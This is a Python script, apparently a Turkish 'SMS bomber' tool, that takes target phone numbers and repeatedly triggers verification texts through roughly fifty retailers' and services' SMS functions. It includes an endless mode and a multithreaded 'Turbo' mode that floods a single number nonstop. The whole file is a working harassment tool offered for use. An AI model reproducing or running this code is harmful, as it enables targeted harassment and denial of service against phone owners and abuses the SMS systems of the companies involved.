from colorama import Fore ,Style #line:1
from time import sleep #line:2
from os import system #line:3
from sms import SendSms #line:4
from concurrent .futures import ThreadPoolExecutor ,wait #line:5
servisler_sms =[]#line:7
for attribute in dir (SendSms ):#line:8
    attribute_value =getattr (SendSms ,attribute )#line:9
    if callable (attribute_value ):#line:10
        if attribute .startswith ('__')==False :#line:11
            servisler_sms .append (attribute )#line:12
while 1 :#line:15
    system ("cls||clear")#line:16
    print ("""{}
   _____    _______                     _____ __  __  _____        __ 
  / ____|  |__   __|                   / ____|  \/  |/ ____|      /_ |
 | (___   __ _| | _____      ___ __   | (___ | \  / | (___   __   _| |
  \___ \ / _` | |/ _ \ \ /\ / / '_ \   \___ \| |\/| |\___ \  \ \ / / |
  ____) | (_| | | (_) \ V  V /| | | |  ____) | |  | |____) |  \ V /| |
 |_____/ \__,_|_|\___/ \_/\_/ |_| |_| |_____/|_|  |_|_____/    \_/ |_|
                                                                      
                                                                           
    
    Sms: {}           {}by {}@xSaTown\n  
    """.format (Fore .LIGHTYELLOW_EX ,len (servisler_sms ),Style .RESET_ALL ,Fore .LIGHTCYAN_EX ))#line:28
    try :#line:29
        menu =(input (Fore .LIGHTMAGENTA_EX +" 1- SMS Gönder (Normal)\n\n 2- SMS Gönder (Turbo)\n\n 3- Çıkış\n\n"+Fore .LIGHTRED_EX +" Seçim: "))#line:30
        if menu =="":#line:31
            continue #line:32
        menu =int (menu )#line:33
    except ValueError :#line:34
        system ("cls||clear")#line:35
        print (Fore .LIGHTRED_EX +"Hatalı giriş yaptın. Tekrar deneyiniz.")#line:36
        sleep (3 )#line:37
        continue #line:38
    if menu ==1 :#line:39
        system ("cls||clear")#line:40
        print (Fore .LIGHTYELLOW_EX +"Telefon numarasını başında '+90' olmadan yazınız (Birden çoksa 'enter' tuşuna basınız): "+Fore .LIGHTGREEN_EX ,end ="")#line:41
        tel_no =input ()#line:42
        tel_liste =[]#line:43
        if tel_no =="":#line:44
            system ("cls||clear")#line:45
            print (Fore .LIGHTYELLOW_EX +"Telefon numaralarının kayıtlı olduğu dosyanın dizinini yazınız: "+Fore .LIGHTGREEN_EX ,end ="")#line:46
            dizin =input ()#line:47
            try :#line:48
                with open (dizin ,"r",encoding ="utf-8")as f :#line:49
                    for i in f .read ().strip ().split ("\n"):#line:50
                        if len (i )==10 :#line:51
                            tel_liste .append (i )#line:52
                sonsuz =""#line:53
            except FileNotFoundError :#line:54
                system ("cls||clear")#line:55
                print (Fore .LIGHTRED_EX +"Hatalı dosya dizini. Tekrar deneyiniz.")#line:56
                sleep (3 )#line:57
                continue #line:58
        else :#line:59
            try :#line:60
                int (tel_no )#line:61
                if len (tel_no )!=10 :#line:62
                    raise ValueError #line:63
                tel_liste .append (tel_no )#line:64
                sonsuz ="(Sonsuz ise 'enter' tuşuna basınız)"#line:65
            except ValueError :#line:66
                system ("cls||clear")#line:67
                print (Fore .LIGHTRED_EX +"Hatalı telefon numarası. Tekrar deneyiniz.")#line:68
                sleep (3 )#line:69
                continue #line:70
        system ("cls||clear")#line:71
        try :#line:72
            print (Fore .LIGHTYELLOW_EX +"Mail adresi (Bilmiyorsanız 'enter' tuşuna basın): "+Fore .LIGHTGREEN_EX ,end ="")#line:73
            mail =input ()#line:74
            if ("@"not in mail or ".com"not in mail )and mail !="":#line:75
                raise #line:76
        except :#line:77
            system ("cls||clear")#line:78
            print (Fore .LIGHTRED_EX +"Hatalı mail adresi. Tekrar deneyiniz.")#line:79
            sleep (3 )#line:80
            continue #line:81
        system ("cls||clear")#line:82
        try :#line:83
            print (Fore .LIGHTYELLOW_EX +f"Kaç adet SMS göndermek istiyorsun {sonsuz}: "+Fore .LIGHTGREEN_EX ,end ="")#line:84
            kere =input ()#line:85
            if kere :#line:86
                kere =int (kere )#line:87
            else :#line:88
                kere =None #line:89
        except ValueError :#line:90
            system ("cls||clear")#line:91
            print (Fore .LIGHTRED_EX +"Hatalı giriş yaptın. Tekrar deneyiniz.")#line:92
            sleep (3 )#line:93
            continue #line:94
        system ("cls||clear")#line:95
        try :#line:96
            print (Fore .LIGHTYELLOW_EX +"Kaç saniye aralıkla göndermek istiyorsun: "+Fore .LIGHTGREEN_EX ,end ="")#line:97
            aralik =int (input ())#line:98
        except ValueError :#line:99
            system ("cls||clear")#line:100
            print (Fore .LIGHTRED_EX +"Hatalı giriş yaptın. Tekrar deneyiniz.")#line:101
            sleep (3 )#line:102
            continue #line:103
        system ("cls||clear")#line:104
        if kere is None :#line:105
            sms =SendSms (tel_no ,mail )#line:106
            while True :#line:107
                for attribute in dir (SendSms ):#line:108
                    attribute_value =getattr (SendSms ,attribute )#line:109
                    if callable (attribute_value ):#line:110
                        if attribute .startswith ('__')==False :#line:111
                            exec ("sms."+attribute +"()")#line:112
                            sleep (aralik )#line:113
        for i in tel_liste :#line:114
            sms =SendSms (i ,mail )#line:115
            if isinstance (kere ,int ):#line:116
                    while sms .adet <kere :#line:117
                        for attribute in dir (SendSms ):#line:118
                            attribute_value =getattr (SendSms ,attribute )#line:119
                            if callable (attribute_value ):#line:120
                                if attribute .startswith ('__')==False :#line:121
                                    if sms .adet ==kere :#line:122
                                        break #line:123
                                    exec ("sms."+attribute +"()")#line:124
                                    sleep (aralik )#line:125
        print (Fore .LIGHTRED_EX +"\nMenüye dönmek için 'enter' tuşuna basınız..")#line:126
        input ()#line:127
    elif menu ==3 :#line:128
        system ("cls||clear")#line:129
        print (Fore .LIGHTRED_EX +"Çıkış yapılıyor...")#line:130
        break #line:131
    elif menu ==2 :#line:132
        system ("cls||clear")#line:133
        print (Fore .LIGHTYELLOW_EX +"Telefon numarasını başında '+90' olmadan yazınız: "+Fore .LIGHTGREEN_EX ,end ="")#line:134
        tel_no =input ()#line:135
        try :#line:136
            int (tel_no )#line:137
            if len (tel_no )!=10 :#line:138
                raise ValueError #line:139
        except ValueError :#line:140
            system ("cls||clear")#line:141
            print (Fore .LIGHTRED_EX +"Hatalı telefon numarası. Tekrar deneyiniz.")#line:142
            sleep (3 )#line:143
            continue #line:144
        system ("cls||clear")#line:145
        try :#line:146
            print (Fore .LIGHTYELLOW_EX +"Mail adresi (Bilmiyorsanız 'enter' tuşuna basın): "+Fore .LIGHTGREEN_EX ,end ="")#line:147
            mail =input ()#line:148
            if ("@"not in mail or ".com"not in mail )and mail !="":#line:149
                raise #line:150
        except :#line:151
            system ("cls||clear")#line:152
            print (Fore .LIGHTRED_EX +"Hatalı mail adresi. Tekrar deneyiniz.")#line:153
            sleep (3 )#line:154
            continue #line:155
        system ("cls||clear")#line:156
        send_sms =SendSms (tel_no ,mail )#line:157
        try :#line:158
            while True :#line:159
                with ThreadPoolExecutor ()as executor :#line:160
                    futures =[executor .submit (send_sms .Akasya ),executor .submit (send_sms .Akbati ),executor .submit (send_sms .Ayyildiz ),executor .submit (send_sms .Baydoner ),executor .submit (send_sms .Beefull ),executor .submit (send_sms .Bim ),executor .submit (send_sms .Bisu ),executor .submit (send_sms .Bodrum ),executor .submit (send_sms .Clickme ),executor .submit (send_sms .Dominos ),executor .submit (send_sms .Englishhome ),executor .submit (send_sms .Evidea ),executor .submit (send_sms .File ),executor .submit (send_sms .Frink ),executor .submit (send_sms .Happy ),executor .submit (send_sms .Hayatsu ),executor .submit (send_sms .Hey ),executor .submit (send_sms .Hizliecza ),executor .submit (send_sms .Icq ),executor .submit (send_sms .Ipragaz ),executor .submit (send_sms .Istegelsin ),executor .submit (send_sms .Joker ),executor .submit (send_sms .KahveDunyasi ),executor .submit (send_sms .KimGb ),executor .submit (send_sms .Komagene ),executor .submit (send_sms .Koton ),executor .submit (send_sms .KuryemGelsin ),executor .submit (send_sms .Macro ),executor .submit (send_sms .Metro ),executor .submit (send_sms .Migros ),executor .submit (send_sms .Naosstars ),executor .submit (send_sms .Paybol ),executor .submit (send_sms .Pidem ),executor .submit (send_sms .Porty ),executor .submit (send_sms .Qumpara ),executor .submit (send_sms .Starbucks ),executor .submit (send_sms .Suiste ),executor .submit (send_sms .Taksim ),executor .submit (send_sms .Tasdelen ),executor .submit (send_sms .Tasimacim ),executor .submit (send_sms .Tazi ),executor .submit (send_sms .TiklaGelsin ),executor .submit (send_sms .ToptanTeslim ),executor .submit (send_sms .Ucdortbes ),executor .submit (send_sms .Uysal ),executor .submit (send_sms .Wmf ),executor .submit (send_sms .Yapp ),executor .submit (send_sms .YilmazTicaret ),executor .submit (send_sms .Yuffi )]#line:211
                    wait (futures )#line:212
        except KeyboardInterrupt :#line:213
            system ("cls||clear")#line:214
            print ("\nCtrl+C tuş kombinasyonu algılandı. Menüye dönülüyor..")#line:215
            sleep (2 )#line:216
